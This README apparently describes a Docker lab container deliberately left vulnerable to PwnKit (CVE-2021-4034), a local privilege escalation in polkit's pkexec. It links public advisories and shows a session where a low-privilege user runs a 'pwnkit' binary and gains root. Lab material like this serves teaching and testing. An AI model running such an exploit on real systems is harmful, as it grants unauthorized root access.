# CVE-2021-4034 - Docker Container Deliberately Vulnerable Version
Docker PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034)

https://seclists.org/oss-sec/2022/q1/80  
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

# PoC

To run the container:

```
user@debian:~$ docker run -it --rm baconspider/cve-2021-4034 bash
low@35bbe8a7ac93:/opt/test$ id
uid=1000(low) gid=1000(low) groups=1000(low)
low@35bbe8a7ac93:/opt/test$ ./pwnkit
root@35bbe8a7ac93:/opt/test# id
uid=0(root) gid=0(root) groups=0(root)
```
